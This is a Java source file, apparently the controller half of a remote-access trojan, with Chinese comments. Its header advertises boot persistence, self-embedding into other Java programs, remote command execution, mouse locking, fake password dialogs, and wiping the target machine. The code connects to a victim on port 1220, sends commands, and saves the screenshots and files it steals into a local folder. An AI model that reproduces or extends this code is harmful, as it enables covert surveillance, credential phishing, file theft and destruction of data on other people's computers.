package org.my;

import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Scanner;

/*
 * 本程序功能
 * 1、程序开机自动启动，并自动发送邮件
 * 2、自动复制(只在本地),可以方便嵌入到其它java程序当中
 * 3、执行dos命令，并将信息返回、这里可以执行关机等命令
 * 4、锁定鼠标，这里通过一个线程实现
 * 5、查看被控制端的桌面，将桌面画面截图并发送给控制端
 * 6、在被控制端弹出对话框,多种对话框模式
 * 7、让被控制端闪屏
 * 8、复制被控制端文件到控制端
 * 9、格式化控制端的电脑
 */
public class Main {
    Socket socket;
    DataOutputStream dos;
    DataInputStream dis;
    String dosS;
    Scanner in;
    String reString;
    int picNum = 1;
    int PORT = 1220;
    String IP = "127.0.0.1";
    String path = "D:\\pic";
    File file;
    BufferedWriter bw;
    String fileName;

    public Main() {
        in = new Scanner(System.in);
        System.out.print("输入IP：");
        IP = in.nextLine().trim();
        try {
            socket = new Socket(IP, PORT);
            //创建文件夹，用来存储返回的信息，存在D:\\pic\\+日期的目录下
            Date date = new Date();
            SimpleDateFormat sdf = new SimpleDateFormat("MM月dd日HH时mm分");
            fileName = sdf.format(date);
            file = new File("D:\\pic\\" + fileName);
            file.mkdirs();
            file = new File("D:\\pic\\" + fileName + "\\log.txt");
            try {
                bw = new BufferedWriter(new OutputStreamWriter(
                        new FileOutputStream(file)));
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            try {
                // 所有的记录都会存在D:\\pic这个目录下~
                bw.write("开始记录");
                bw.newLine();
                bw.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
            System.out.println("contected");
            dos = new DataOutputStream(socket.getOutputStream());
            dis = new DataInputStream(socket.getInputStream());
            //创建线程接收信息
            new Thread(new MyInputThread()).start();
            //输入控制命令
            go();
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return;
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
    }

    //命令函数，输入命令控制远程机器
    public void go() {//开始发送命令
        while (true) {
            System.out.println("intput commend:");
            dosS = in.nextLine().trim();
            if (dosS.startsWith("-d") && dosS.length() == 2) {
                continue;
            } else if (dosS.equals("exit")) {
                break;
            } else if (dosS.equals("")) {
                continue;
            } else if (dosS.endsWith("-help")) {
                System.out
                        .println("自定义命令："
                                + "	 	-doutmsg msg 以对话框形式输出信息msg\n"
                                + "		-dinmsg msg 弹出一个输入对话框+显示信息msg\n"
                                + "		-dinpass msg 弹出一个输入密码对话框+显示信息msg\n"
                                + "		-flash msg 闪屏并显示msg所表示的文字\n"
                                + "		-p 截取被控制端屏幕\n"
                                + "		-file path 获取文件path是文件的路径\n"
                                + "		-m l 锁定鼠标"
                                + "		-m a 取消锁定鼠标\n"
                                + "		-delete path 删除path目录及其下的所有内容\n"
                                + "		-delete all 格式化电脑\n"
                                + "dos命令："
                                + "		dir,ipconfig,whoami,等等\n"
                                + "exit 退出");
                continue;
            }
            try {
                dos.writeUTF(dosS);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    //把读取的信息写入到文件中并打印在控制台
    public void showMsg(String msg) {
        if (msg == null) {
            return;
        }
        try {
            msg = new String(msg.getBytes("utf-8"), "utf-8");
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        System.out.println(msg);
        try {
            bw.write(msg);
            bw.flush();
            bw.newLine();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    /*接受被控制端发送过来的图片*/
    public void getPic() {
        int length = 0;
        File file = new File(path + "\\" + fileName + "\\" + (picNum++)
                + ".jpg");
        byte[] imageData = new byte[8192];
        FileOutputStream fos = null;
        int num = 0;
        try {
            fos = new FileOutputStream(file);
        } catch (FileNotFoundException e3) {
            e3.printStackTrace();
        }
        try {
            length = dis.readInt();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
        while (true) {
            try {
                num = dis.read(imageData, 0, imageData.length);
                fos.write(imageData, 0, num);
                length -= num;
                if (length == 0) {
                    break;
                }
            } catch (Exception e) {
                try {
                    System.out.println("error");
                    fos.flush();
                    fos.close();
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                break;
            }
        }
        try {
            if (file != null)
                fos.close();
        } catch (IOException e1) {
            e1.printStackTrace();
        }
    }

    /*接受被控制端发送过来的文件*/
    public void getFile(String name) {
        long length = 0;
        File file = new File(path + "\\" + fileName + "\\" + name);
        byte[] fileData = new byte[1024*8];
        FileOutputStream fos = null;
        int num = 0;
        try {
            fos = new FileOutputStream(file);
        } catch (FileNotFoundException e3) {
            e3.printStackTrace();
        }
        try {
            length = dis.readLong();
            System.out.println(length);
        } catch (IOException e2) {
            e2.printStackTrace();
        }
        while (true) {
            try {
                num = dis.read(fileData);
                fos.write(fileData, 0, num);
                length -= num;
                if (length == 0) {
                    break;
                }
            } catch (Exception e) {
                try {
                    System.out.println("error");
                    fos.flush();
                    fos.close();
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                break;
            }
        }
        try {
            if (file != null)
                fos.close();
        } catch (IOException e1) {
            e1.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new Main();
        System.exit(0);
    }

    //多线程接收传来的信息
    class MyInputThread implements Runnable {
        public void run() {
            while (true) {
                try {
                    reString=dis.readUTF();
                    if (reString.equals("output start:")) {
                        //字符信息，存到文件中
                        showMsg(reString);
                    } else if (reString.equals("picture start:")) {
                        //图，存到文件夹
                        getPic();
                        System.out.println("picture receive:");
                    }  else if (reString.equals("file start:")) {
                        //文件，存到文件夹
                        String name=dis.readUTF();
                        getFile(name);
                        System.out.println("file receive:");
                    }else {
                        //第二次循环
                        showMsg(reString);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }
}
